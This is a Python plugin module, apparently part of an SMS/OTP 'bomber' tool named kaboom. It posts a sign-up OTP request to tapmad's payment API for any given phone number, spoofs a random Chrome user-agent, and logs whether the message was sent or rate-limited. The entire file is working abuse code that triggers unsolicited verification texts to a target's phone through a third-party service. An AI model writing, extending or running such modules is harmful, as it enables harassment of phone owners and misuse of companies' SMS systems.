from kaboom.core import *
from kaboom.localuseragent import *

async def tapmad(phone, client, out):
    name = "tapmad"
    domain = "tapmad"
    frequent_rate_limit=False

    headers = {
            "user-agent": random.choice(ua["browsers"]["chrome"]),
    }
    json_data = {
        'Version': 'V1',
        'Language': 'en',
        'Platform': 'web',
        'ProductId': 1733,
        'MobileNo': f"{phone[-10:]}",
        'OperatorId': '100007',
        'URL': 'https://www.tapmad.com/sign-up',
        'source': 'organic',
        'medium': 'organic',
    }

    response = await client.post(
        'https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage',
        headers=headers,
        json=json_data,
    )
    try:
        data=response.json()
        if data["Response"]['message'] == "OTP Code send Successfuly.":
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
            return None
        if data["Response"]['status'] == "Threshold" or "blocked" in data["Response"].get("message", "").lower():
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": True,"sent": False, "error": False, "reason": data["Response"].get("message") or "request threshold reached"})
            return None
        else:
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": False, "error": True, "reason": data["Response"].get("message") or "otp request failed"})
            return None
    except Exception as exc:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True, "reason": str(exc) or type(exc).__name__})
        return None
